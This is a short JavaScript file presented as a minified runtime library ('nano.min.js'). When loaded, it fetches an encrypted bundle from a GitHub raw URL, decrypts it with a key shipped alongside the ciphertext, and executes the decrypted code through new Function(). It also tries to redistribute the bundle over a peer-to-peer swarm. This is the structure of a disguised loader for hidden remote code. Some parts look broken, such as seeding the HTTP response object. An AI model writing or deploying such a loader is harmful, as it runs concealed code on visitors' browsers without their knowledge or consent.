// nano.min.js (Runtime Kernel Execution)
(async function() {
    console.info('[nano.js KERNEL] Initializing static AES-GCM PEX seeding & decryption pipeline...');

    try {
        const res = await fetch('https://raw.githubusercontent.com/IngloriousNorth/EmeraldTemple/refs/heads/main/src/Gate.bundle.enc');
        if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
        const packageData = await res.json();

        const rawCiphertext = Uint8Array.from(atob(packageData.ciphertext), c => c.charCodeAt(0));

        // 1. Anchor the deterministic PEX swarm via client.seed()
        const client = window.client;
        if (client) {
            client.seed(res, {
                name: 'Gate.bundle.enc',
                dht: false,
                tracker: false,
                announce : [],
                urlList: ["https://raw.githubusercontent.com/IngloriousNorth/EmeraldTemple/refs/heads/main/src/Gate.bundle.enc"],
                pex: true
            }, (torrent) => {
                console.info(`[nano.js KERNEL] Static sovereign PEX swarm anchored: ${torrent.infoHash}`);
            });
        }

        // 2. Decode cryptographic parameters
        const iv = Uint8Array.from(matchHex(packageData.iv));
        const keyBytes = Uint8Array.from(matchHex(packageData.secretKeyMock));
        const authTag = Uint8Array.from(matchHex(packageData.authTag));

        // 3. Prepare AES-GCM payload buffer (ciphertext + authTag)
        const encryptedData = new Uint8Array(rawCiphertext.length + authTag.length);
        encryptedData.set(rawCiphertext);
        encryptedData.set(authTag, rawCiphertext.length);

        // 4. Decrypt via SubtleCrypto
        const cryptoKey = await crypto.subtle.importKey(
            'raw',
            keyBytes,
            { name: 'AES-GCM' },
            false,
            ['decrypt']
        );

        const decryptedBuffer = await crypto.subtle.decrypt(
            { name: 'AES-GCM', iv: iv, tagLength: 128 },
            cryptoKey,
            encryptedData
        );

        const decryptedCode = new TextDecoder().decode(decryptedBuffer);

        // 5. Execute decrypted bundle natively
        const executeCode = new Function(decryptedCode);
        executeCode();
        console.info('[nano.js KERNEL SUCCESS] Static AES-GCM bundle successfully compiled and executed.');

    } catch (err) {
        console.error('[nano.js KERNEL ERROR]:', err);
    }
})();

function matchHex(hexString) {
    return hexString.match(/.{1,2}/g).map(byte => parseInt(byte, 16));
}